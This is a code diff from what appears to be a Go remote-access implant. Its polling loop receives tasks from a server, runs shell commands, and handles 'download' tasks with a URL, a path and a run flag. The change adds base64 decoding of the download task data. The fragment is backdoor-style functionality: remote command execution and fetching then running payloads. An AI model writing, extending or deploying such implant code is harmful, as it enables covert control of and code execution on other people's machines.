@@ -38,10 +38,10 @@ type Core struct {
 	sleep         int
 	uuid          string
 	event         []Result
+
 }
 
 func (c *Core) Pool() {
-
 	client := &http.Client{}
 	for {
 		fmt.Println("Loop")
@@ -87,7 +87,6 @@ func (c *Core) Pool() {
 					break
 				}
 				fmt.Println("cmd", cmdData)
-
 				var cmd shell.Shell
 				err = json.Unmarshal([]byte(cmdData), &cmd)
 				if err != nil {
@@ -101,8 +100,14 @@ func (c *Core) Pool() {
 
 			case "download":
 				var down shell.Down
+				downData, err := base64.StdEncoding.DecodeString(i.Data)
+				if err != nil {
+					c.event = append(c.event, Result{Action: "download", Data: err.Error()})
+					break
+				}
+				err = json.Unmarshal([]byte(downData), &down)
 
-				err := json.Unmarshal([]byte(i.Data), &down)
+				fmt.Println("download",down.Path,down.Url,down.IsRun)
 				if err != nil {
 					c.event = append(c.event, Result{Action: "download", Data: err.Error()})
 				}
